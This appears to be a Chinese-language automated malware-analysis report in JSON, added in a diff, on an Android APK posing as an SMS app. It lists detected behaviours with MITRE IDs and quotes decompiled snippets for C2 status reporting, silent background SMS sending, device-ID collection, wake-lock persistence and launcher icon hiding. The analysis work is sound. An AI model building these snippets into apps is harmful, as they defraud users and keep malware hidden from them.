@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "2f9137c1c1e31a7e58a6ad469bd7c268e3a5cd5582e6f930944580a8b1ff827a.apk",
+    "sha256": "2f9137c1c1e31a7e58a6ad469bd7c268e3a5cd5582e6f930944580a8b1ff827a",
+    "包名": "ru.vote.majority",
+    "应用名": "CМС - Сoобщение",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 145.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vote\\majority\\Buffet;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new d(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class Buffet extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new d(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "BroadcastReceiver接收到广播后，从Intent中提取id、command、post等参数以及广播结果码，通过自定义网络请求类d构建HTTP请求（参数3可能代表请求类型/端点），将command指令和状态信息上报至C2服务器，实现远程控制指令的接收与执行状态回传",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vote\\majority\\a;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              IronyCrash.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              b.a(context, e, str, str2);\n          }",
+          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信，目标号码(str)和短信内容(str2)均来自方法参数，无需用户交互即可发送，可能导致用户在不知情的情况下发送付费短信造成资费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vote\\majority\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 9549) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 读取系统属性 android_id，获取设备的唯一标识符并返回给调用方。android_id 是设备级别的持久标识符，可用于跨应用追踪和设备指纹构建。在已确认的恶意样本中，此行为通常作为设备指纹采集的一环，收集的标识符后续可能被上传至C2服务器用于受害者追踪或定向攻击。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vote\\majority\\ImportantBee;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(b());\n} else {\n    startService(b());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Exploration\");\nthis.b.setReferenceCounted(false);\nthis.b.acquire();",
+          "malicious_code_snippet_context": "                  b.a(ImportantBee.this.getApplicationContext(), th, new Object[0]);\n              }\n          });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(b());\n>>>         } else {\n>>>             startService(b());\n>>>         }\n>>>         registerReceiver(new Buffet(), new IntentFilter(\"status\"));\n>>>         this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Exploration\");\n>>>         this.b.setReferenceCounted(false);\n          this.b.acquire();\n          a.a(getApplicationContext(), System.currentTimeMillis());\n          HandlerThread handlerThread = new HandlerThread(\"Judicial\");",
+          "behavior_description": "代码在Service的onCreate中，通过判断SDK版本启动前台服务或普通服务，并获取PARTIAL_WAKE_LOCK锁以保持CPU唤醒，防止设备休眠，结合异常处理器和后台线程，实现恶意服务的持久化保活，确保恶意行为持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vote\\majority\\Dump;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Dump.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class Dump extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Dump.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该代码在 Activity 的 onCreate 中调用 a() 方法，通过 PackageManager.setComponentEnabledSetting 将自身组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），并使用 DONT_KILL_APP 标志（参数1）避免进程被杀死。组件被禁用后，应用图标将从启动器中消失，用户无法通过桌面图标找到或卸载该应用。这是 Android 恶意软件常用的图标隐藏技术，用于在安装后隐蔽自身存在，逃避用户察觉和卸载，为后续恶意行为提供持久化掩护。数据流向：getApplicationContext() 获取上下文 → setComponentEnabledSetting() 禁用组件隐藏图标。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
